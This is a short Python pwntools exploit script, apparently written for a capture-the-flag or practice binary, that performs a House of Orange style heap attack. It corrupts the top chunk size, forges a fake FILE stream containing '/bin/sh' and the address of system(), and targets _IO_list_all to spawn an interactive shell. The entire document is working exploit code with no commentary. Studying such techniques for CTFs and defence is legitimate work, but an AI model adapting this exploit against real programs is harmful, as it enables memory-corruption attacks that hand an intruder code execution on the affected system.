from pwn import *
from handle import *

def exploit():
	system_function = system_address()

	malloc(0x400 - 0x10)
	malloc(0x80)
	free_chunk(1)


	A = chunk_info(0)
	top = A[0] + 0x400 - 0x10


	fake_top_size = (0x21000 - 0x400) & 0x00fff
	write_to_chunk(0, 'A' * (0x400 - 0x8) + (p64(fake_top_size|1)))

	malloc(fake_top_size + 0x400)

	top_info = chunk_info(1)
	io_list_all = top_info[1] + 0x9a8

	payload = 'b'*0x3f0
	stream = '/bin/sh\x00' + p64(0x101) + p64(top_info[1]) + p64(io_list_all-0x10)
	stream += p64(0x2) + p64(0x3)
	stream = stream.ljust(0x60,'\x00')
	stream += p64(0) * 3
	stream += p64(system_function)
	stream = stream.ljust(0xc0,'\x00')
	stream += p64(0x0)
	stream = stream.ljust(0xd8,'\x00')
	stream += p64(top + 12*SIZE_SZ)
	payload += stream

	write_to_chunk(0, payload)

	malloc(10)

p = exec_file()
exploit()
p.interactive()
p.close()
